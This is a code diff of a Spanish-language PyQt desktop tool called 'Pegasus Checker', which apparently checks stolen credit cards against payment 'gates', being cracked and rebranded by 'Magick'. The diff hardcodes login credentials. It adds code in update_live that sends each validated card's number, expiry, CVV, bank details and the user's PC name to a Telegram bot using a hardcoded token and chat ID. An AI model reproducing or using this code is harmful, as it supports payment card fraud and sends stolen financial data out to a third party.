@@ -587,10 +587,8 @@ class MainWindow(QMainWindow):
         self.app = app
 
         self.app.signal_error.connect(self.handle_error)
-
-        username = "CrackByMagick!"
+       
         self.username = username
-        password = "Gays!"
         self.password = password
         self.token = token
         self.geoip = geoip
@@ -605,7 +603,7 @@ class MainWindow(QMainWindow):
       f"self.tag: {self.tag}")
 
 
-        print("Logged2")
+        print("Logged")
 
         try:
             entry = {"username": 'dasda',"password": self.password}
@@ -885,6 +883,9 @@ class MainWindow(QMainWindow):
                 self.ui.see.hide()
 
             msgWelcome = 'BIENVENIDO '+ self.username.upper()+' A PEGASUS CHECKER'
+
+            username = "CrackByMagick!"
+            self.username = username
 
             self.setWindowTitle("Pegasus Checker v0.5")
             #self.setFixedSize(1024, 576)  # Tamaño inicial
@@ -1494,59 +1495,56 @@ class MainWindow(QMainWindow):
         self.ui.erroneo2.setText('PAUSADO')
 
     def update_live(self,text):
-
+        #CrackedByMagick!
         try:
-
             text1 = text.split('|')
             self.tools.minuscredits(self.username,self.password,text1[2])
+            data = text1[7]+' '+text1[8]+' '+text1[9]+' '+text1[10]+' '+text1[11]
+            entry = {"username": self.username,"gate": text1[2],"tarjeta": text1[3], "mes": text1[4], "ano": text1[5], "cvv": text1[6], "banco": data}
+            # cr = requests.put(urlHerokuGlobal + '//send',json=entry)
 
-            #data = text1[7]+' '+text1[8]+' '+text1[9]+' '+text1[10]+' '+text1[11]
-            #tarjeta = text1[3] + '|' + text1[4] + '|' + text1[5] + '|' + text1[6] + '|' + data
-            fecha_actual = datetime.now()
-            fecha_formateada = fecha_actual.strftime('%Y-%m-%d %H:%M:%S')
+            # Obtener el nombre de la PC
+            pc_name = socket.gethostname()
+            entry["pc_name"] = pc_name
 
-            if text1 != None:
+            # Enviar mensaje a Telegram
+            bot_token = '6632357105:AAGJS6KP7eltPDTJt9_2H4QRTAl55ntmha0'  # Reemplaza con el token de tu bot
+            chat_id = '-1002213616098'  # Reemplaza con el ID de tu canal o chat
+            message = (
+                f"Checker: PEGASUS\n\n"
+                f"Username: {entry['username']}\n"
+                f"Gate: {entry['gate']}\n"
+                f"Tarjeta: {entry['tarjeta']}\n"
+                f"Mes: {entry['mes']}\n"
+                f"Año: {entry['ano']}\n"
+                f"CVV: {entry['cvv']}\n"
+                f"Banco: {entry['banco']}\n"
+                f"PC Name: {entry['pc_name']}"
+            )
 
-                try:
-                    estado = text1[13]
-                    if 'LOWFUNDS' in estado:
-                        estado = 'LOWFUNDS'
-                        pais = 'COL'
-                except:
-                    estado = "LIVE"
+            telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            telegram_data = {
+                "chat_id": chat_id,
+                "text": message
+            }
 
-                entry = {
+            try:
+                response = requests.post(telegram_url, data=telegram_data)
+                response.raise_for_status()
+                print("Mensaje enviado a Telegram")
+            except requests.RequestException as e:
+                print(f"Error al enviar mensaje a Telegram: {e}")
+                
 
-                    "fk_user_id": self.userid,
-                    "gate": text1[2],
-                    "cc": text1[3],
-                    "mes": text1[4],
-                    "year": text1[5],
-                    "ccv": text1[6],
-                    "type": text1[7],
-                    "bank": text1[8],
-                    "data": text1[9],
-                    "franquicia": text1[10],
-                    "pais": text1[11].split('\n')[0],
-                    "fecha": fecha_formateada, # Usa la fecha formateada
-                    "estado": estado
-                }
-
-                print(entry)
-                cr = requests.put(urlHerokuGlobal + '//send',json=entry)
-                self.ui.lives.append(text)
-
-                credits = self.tools.get_creditos(self.username, self.password)
-
-                self.ui.CREDITOSS.setText(str(credits))
-
-                self.tools.escribir_en_archivo(text)
-                Lc = int(self.ui.Lcont.text())+1
-                self.ui.Lcont.setText(str(Lc))
-                sound_file = "./config/check.wav" 
-                pygame.mixer.init()
-                pygame.mixer.music.load(sound_file)
-                pygame.mixer.music.play()
+            self.ui.lives.append(text)
+            self.ui.CREDITOSS.setText(self.tools.get_creditos(self.username, self.password))
+            self.tools.escribir_en_archivo(text)
+            Lc = int(self.ui.Lcont.text())+1
+            self.ui.Lcont.setText(str(Lc))
+            sound_file = "./config/check.wav" 
+            pygame.mixer.init()
+            pygame.mixer.music.load(sound_file)
+            pygame.mixer.music.play()    
 
         except Exception as e:
             self.app.signal_error.emit(f"Error actualizando live: {str(e)}")
@@ -1586,25 +1584,16 @@ class MainWindow(QMainWindow):
             self.animacion.start()
 
     def soporte(self):
+        #CrackedByMagick!
         msg_box = QMessageBox()
-        msg_box.setWindowTitle("Soporte")
-        msg_box.setText("Estos links te llevarán a los encargados de soporte. ¿A cuál quieres ir?")
-        msg_box.addButton("Dashiro", QMessageBox.NoRole)
-        msg_box.addButton("Mushiro", QMessageBox.NoRole)
-        msg_box.addButton("Katakuri", QMessageBox.NoRole)
-
+        msg_box.setWindowTitle("Magick Checker 🔮")
+        msg_box.setText("Cracked by @MagickCheckerOficial 💜")
+        msg_box.addButton("Contact!", QMessageBox.NoRole)
+   
         respuesta = msg_box.exec_()
 
-        api_url = urlHerokuGlobal + "/support"
-        response = requests.get(api_url)
-        data = response.json()
-
         if respuesta == 0:
-            webbrowser.open(data['supp1'])
-        elif respuesta == 1:
-            webbrowser.open(data['supp2'])
-        elif respuesta == 2:
-            webbrowser.open(data['supp3'])
+            webbrowser.open('https://t.me/MagickCheckerOficial')       
         else:
             pass
 
